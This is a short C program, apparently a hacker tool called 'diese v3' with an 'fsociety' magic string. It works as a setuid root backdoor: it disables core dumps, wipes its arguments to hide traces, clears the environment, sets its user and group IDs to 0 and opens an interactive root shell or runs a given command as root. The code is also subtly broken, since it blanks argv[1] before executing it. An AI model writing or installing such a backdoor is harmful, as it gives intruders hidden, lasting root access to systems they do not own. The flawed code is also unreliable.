#define MAGIC "fsociety_diese_v3_31337_XAI_Twrst"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#ifdef __linux__
#include <sys/prctl.h>
#elif defined(__FreeBSD__)
#include <sys/procctl.h>
#endif

static void wipe_env(void) {
    clearenv();
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("IFS", " \t\n", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
}

int main(int argc, char **argv) {
#ifdef __linux__
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
#elif defined(__FreeBSD__)
    int no_new_privs = PROC_NO_NEW_PRIVS_ENABLE;
    procctl(P_PID, 0, PROC_NO_NEW_PRIVS_CTL, &no_new_privs);
#endif

    // Wipe argv traces
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }

    if (geteuid() != 0) {
        fprintf(stderr, "\033[31m[!] diese: elevation failed.\033[0m\n");
        return 1;
    }

    wipe_env();

    if (setresuid(0, 0, 0) != 0 || setresgid(0, 0, 0) != 0) {
        perror("setresuid/gid");
        return 1;
    }

    printf("\033[31m[diese v3] uid=0(root) gid=0(wheel) context=locked\033[0m\n");
    printf("[*] Environment nuked. Ghost mode active.\n\n");

    if (argc > 1) {
        execvp(argv[1], &argv[1]);
    } else {
        execl("/bin/sh", "/bin/sh", "-i", NULL);
    }

    perror("exec failed");
    return 1;
}
